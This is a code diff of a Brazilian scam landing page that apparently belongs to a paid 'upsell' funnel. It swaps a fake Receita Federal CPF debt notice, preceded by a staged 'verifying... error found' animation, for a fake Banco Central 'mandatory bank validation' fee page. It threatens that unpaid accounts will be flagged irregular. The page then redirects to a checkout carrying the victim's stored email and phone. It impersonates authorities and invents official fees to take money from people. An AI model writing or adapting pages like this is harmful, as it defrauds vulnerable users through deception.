@@ -1,15 +1,15 @@
 <!DOCTYPE html><html lang="pt-BR"><head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Upsell 4 - Pendência Receita Federal</title>
-    
+    <title>Upsell 5 - Validação Bancária</title>
+   
     <!-- Facebook Pixel -->
     <script src="../js/facebook-pixel.js"></script>
-    
+   
     <script>
-        localStorage.setItem("upsell", "up4");
+        localStorage.setItem("upsell", "up5");
     </script>
-    
+   
 <script
   src="https://cdn.utmify.com.br/scripts/utms/latest.js"
   data-utmify-prevent-xcod-sck
@@ -23,196 +23,133 @@
             font-family: 'Arial', sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #eef2f3;
+            background-color: #f8f9fa;
+            color: #333;
         }
 
         .header {
             background-color: #004080;
             padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            text-align: center;
         }
 
         .header img {
-            width: 65%;
-            padding: 0%;
-            margin-bottom: 0%;
-            margin-top: -5%;
+            max-width: 150px;
         }
 
         .container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: calc(100vh - 100px);
+            max-width: 600px;
+            margin: 40px auto;
+            padding: 30px;
+            background: #ffffff;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
             text-align: center;
-            padding: 20px;
-            background: linear-gradient(135deg, #002776, #0044cc);
-            color: white;
         }
 
         .container h1 {
-            font-size: 28px;
+            color: #004080;
+            font-size: 26px;
             margin-bottom: 20px;
-            margin-top: -35%;
             font-weight: bold;
-        }
-
-        .loading {
-            font-size: 18px;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .loading span {
-            margin-left: 10px;
-            font-weight: bold;
-        }
-
-        .loading-bar {
-            width: 80%;
-            height: 8px;
-            background-color: #cce5ff;
-            border-radius: 5px;
-            overflow: hidden;
-            margin: 15px 0;
-            position: relative;
-        }
-
-        .loading-bar div {
-            height: 100%;
-            width: 0;
-            background-color: #ffcc00;
-            animation: loading 6s linear forwards;
-        }
-
-        @keyframes loading {
-            0% {
-                width: 0;
-            }
-
-            100% {
-                width: 100%;
-            }
         }
 
         .container p {
-            font-size: 18px;
-            margin: 15px 0;
+            font-size: 16px;
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 20px;
         }
 
-        .container .highlight {
-            color: #ffcc00;
+        .highlight {
+            color: #004080;
             font-weight: bold;
         }
 
-        .action {
+        .cta {
             margin-top: 30px;
-            display: none;
         }
 
-        .action button {
-            background-color: #ffcc00;
-            color: #002776;
+        .cta button {
+            background-color: #004080;
+            color: white;
+            padding: 15px 30px;
             border: none;
-            padding: 15px 25px;
             font-size: 18px;
             font-weight: bold;
-            border-radius: 8px;
+            border-radius: 5px;
             cursor: pointer;
-            transition: all 0.3s ease;
+            transition: background-color 0.3s;
         }
 
-        .action button:hover {
-            background-color: #ffd633;
+        .cta button:hover {
+            background-color: #0056b3;
         }
 
         .footer {
-            margin-top: 20px;
+            margin-top: 30px;
             font-size: 14px;
-            color: #cce5ff;
+            color: #777;
         }
 
         .footer strong {
-            color: #ffcc00;
+            color: #d9534f;
+        }
+
+        .info-box {
+            background-color: #f1f1f1;
+            border-left: 5px solid #004080;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+            font-size: 15px;
+            color: #333;
+        }
+
+        .info-box h3 {
+            margin: 0;
+            font-size: 16px;
+            font-weight: bold;
         }
     </style>
-    <script>
-        // Debug: Log dos parâmetros recebidos na página up4
-        console.log('=== DEBUG UP4 PAGE ===');
-        console.log('URL atual:', window.location.href);
-        console.log('Parâmetros recebidos:', window.location.search);
-        if (window.location.search) {
-            console.log('Parâmetros parseados:', new URLSearchParams(window.location.search));
-        }
-    </script>
-    <script>
-        document.addEventListener("DOMContentLoaded", function () {
-            const container = document.querySelector(".container");
-            const actionSection = document.querySelector(".action");
-            const loadingBar = document.querySelector(".loading-bar div");
-            const loadingElements = document.querySelectorAll(".loading, .loading-bar");
-            let step = 0;
-
-            const steps = [
-                "Verificando pagamento...",
-                "Verificando dados...",
-                "Erro encontrado!"
-            ];
-
-            const interval = setInterval(() => {
-                if (step < steps.length) {
-                    container.querySelector("h1").textContent = steps[step];
-                    step++;
-                } else {
-                    clearInterval(interval);
-                    container.querySelector("h1").textContent = "⚠️ Pendência na Receita Federal!";
-                    loadingElements.forEach(el => el.style.display = "none");
-                    actionSection.style.display = "block";
-                }
-            }, 2000);
-
-    
-            loadingBar.style.animationPlayState = 'running';
-        });
-    </script>
 </head>
-
 <body>
 
     <div class="header">
-        <img src="https://s3.typebot.io/public/workspaces/clpwrgv88001vlh0fl3wduaqz/typebots/clsoykmoc0001o1a8fuuy3j8r/blocks/ymggz8eopp0fj524hfxubuit?v=1735166818525" alt="Logo Receita Federal">
+        <img src="https://s3.typebot.io/public/workspaces/clpwrgv88001vlh0fl3wduaqz/typebots/clsoykmoc0001o1a8fuuy3j8r/blocks/ymggz8eopp0fj524hfxubuit?v=1735166818525" alt="Logo Banco Central">
     </div>
 
     <div class="container">
-        <h1>⚠️ Verificando...</h1>
-        <div class="loading">
-            <span>Processando informações...</span>
-        </div>
-        <div class="loading-bar">
-            <div></div>
+        <h1>🔒 Validação Bancária Obrigatória</h1>
+        <p>Para garantir a segurança e regularidade da sua transferência, é necessária a realização de uma <span class="highlight">validação bancária obrigatória</span>, conforme as normas do sistema bancário nacional.</p>
+
+        <div class="info-box">
+            <h3>Por que a validação é necessária?</h3>
+            <p>✔️ Evita transações inválidas ou bloqueios futuros.</p>
+            <p>✔️ Confirma a autenticidade dos seus dados bancários.</p>
+            <p>✔️ Libera sua transferência com total segurança.</p>
         </div>
 
-        <div class="action">
-            <p>Identificamos uma pendência relacionada ao seu <span class="highlight">CPF</span>.</p>
-            <p>Para resolver, é necessário efetuar o pagamento da <span class="highlight">Taxa de Regularização</span>.
-            </p>
-            <p>O valor é de <span class="highlight">R$ 85,00</span>. Após o pagamento, sua solicitação será liberada
-                imediatamente!</p>
+        <p><strong>Valor da Taxa:</strong> <span class="highlight">R$ 18,25</span></p>
+        <p><strong>Prazo para Validação:</strong> Até 15 minutos após o pagamento.</p>
 
-            <div class="cta">
-                <button onclick="checkout(event)">REGULARIZAR AGORA</button>
-            </div>
+        <div class="cta">
+            <button onclick="checkout(event)">VALIDAR AGORA</button>
         </div>
 
         <div class="footer">
-            ⚠️ <strong>Atenção:</strong> O não pagamento pode causar o bloqueio definitivo do processo.
+            ⚠️ <strong>Atenção:</strong> O não pagamento pode causar o registro de sua conta como <strong>irregular</strong>, impactando futuras transações financeiras.
         </div>
     </div>
+    <script>
+            // Debug: Log dos parâmetros recebidos na página up5
+            console.log('=== DEBUG UP5 PAGE ===');
+            console.log('URL atual:', window.location.href);
+            console.log('Parâmetros recebidos:', window.location.search);
+            if (window.location.search) {
+                console.log('Parâmetros parseados:', new URLSearchParams(window.location.search));
+            }
+        </script>
     <script>
         function getUrlParams() {
             const params = {};
@@ -243,7 +180,7 @@
                 const email = localStorage.getItem('email') || '';
                 const telephone = localStorage.getItem('telephone') || '';
                 
-                const baseUrl = 'https://pay.novopagamentooseguro.com/checkout/01909ce3-c53e-407b-9271-94977c263952';
+                const baseUrl = 'https://pay.novopagamentooseguro.com/checkout/d7bebdab-107a-4ce9-ba72-93e602c0523f';
                 const url = new URL(baseUrl);
                 
                 // Adicionar parâmetros do usuário
@@ -258,7 +195,7 @@
                 window.location.href = finalUrl;
             } catch(err) {
                 console.error('Erro ao redirecionar:', err);
-                window.location.href = buildUrlWithParams('https://pay.novopagamentooseguro.com/checkout/01909ce3-c53e-407b-9271-94977c263952');
+                window.location.href = buildUrlWithParams('https://pay.novopagamentooseguro.com/checkout/d7bebdab-107a-4ce9-ba72-93e602c0523f');
             }
         }
 
@@ -266,14 +203,14 @@
         document.addEventListener('DOMContentLoaded', function() {
             if (typeof fbq !== 'undefined') {
                 fbq('track', 'ViewContent', {
-                    content_name: 'Upsell UP4 - Pendência Receita Federal',
+                    content_name: 'Upsell UP5 - Validação Bancária',
                     content_type: 'upsell_page',
                     currency: 'BRL'
                 });
-                console.log('🎯 Facebook Pixel: ViewContent tracked for UP4 upsell page');
+                console.log('🎯 Facebook Pixel: ViewContent tracked for UP5 upsell page');
             }
         });
     </script>
-
+    </script>
 
 </body></html>
